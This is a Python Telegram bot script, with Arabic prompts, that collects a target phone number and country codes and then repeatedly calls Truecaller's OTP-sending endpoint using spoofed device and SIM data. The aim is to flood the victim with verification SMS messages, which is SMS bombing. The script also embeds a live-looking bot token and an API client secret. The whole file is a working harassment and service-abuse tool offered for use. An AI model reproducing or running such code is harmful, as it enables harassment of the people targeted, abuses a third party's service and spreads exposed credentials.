import requests,hashlib,random,time,webbrowser
import requests,telebot
from time import sleep
from telebot import types

ti=0
token = "6848848118:AAHi59iKKwPfC8AybBSHxJj7zw2jkpykHyc"
ags = telebot.TeleBot(token)
@ags.message_handler(commands = ['start'])
def Start(message):
 id = message.from_user.id
 a = message.from_user.first_name
 b = message.from_user.username
 ags.reply_to(message, """  
 *
 اهلا بك {}

 your user : @{}
 your id : {}
 *
 """.format(a,b,id), parse_mode = "markdown" , reply_markup = A)
@ags.callback_query_handler(func=lambda call: True)
def answer(call):
 if call.data=="n2":
  n2(call.message)
A = types.InlineKeyboardMarkup(row_width=2)
F = types.InlineKeyboardButton(f" بدا الاسبام -",callback_data='n2')
A.add(F)  
def n2(message):
 hj=ags.send_message(message.chat.id,f"- ارسل رمز دولة الرقم مثلا العراق iq الاردن jo . ") 
 ags.register_next_step_handler(hj,se)
def se(message):
 global countryCode
 countryCode = message.text
 cou=ags.send_message(message.chat.id,f"- ارسل كود دولتك بدون +. ")
 ags.register_next_step_handler(cou,dl)
def dl(message):
 global dialingCode
 dialingCode = message.text
 pas=ags.send_message(message.chat.id,f"- ارسل الرقم بدك تعمل عليه اسبام🚹 ")
 ags.register_next_step_handler(pas,nmb)
def nmb(message):
 global number
 number = message.text
 nu=ags.send_message(message.chat.id,f"- ارسل حرف Y ")
 ags.register_next_step_handler(nu,sbam) 
def sbam(message):
 global num,countryCode,number,dialingCode
 try: 
  num = message.text
  if 'Y' == num:
   rna=10
  else:
   rna=1
  for i in range(rna):
    asa = '123456789'
    gigk = str(''.join(random.choice(asa) for i in range(10)))
    md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
    url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
    headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }
    data = '{"countryCode":"'+countryCode+'","dialingCode":'+dialingCode+',"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+md5+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+number+'","region":"region-2","sequenceNo":1}' 
    req = requests.post(url, headers=headers, data=data).text
    if 'Phone number limit reached' in req:
     ags.reply_to(message,text="- Error Limit Number🚹. ")
     exit()
    elif 'token' in req:
     ags.reply_to(message,text=f"-  {number} : Done Spam number🎭 . ")
    if 'Y' == num:
      time.sleep(60)
    else:ags.reply_to(message,text="- لديك خطأ تاكد من معلوماتك 🚼 ")
   
 except:
  ags.reply_to(message,text="- Error. ")

while True:
 try:
  ags.polling(none_stop=True)
 except Exception as er:
  print(er)
  sleep(7)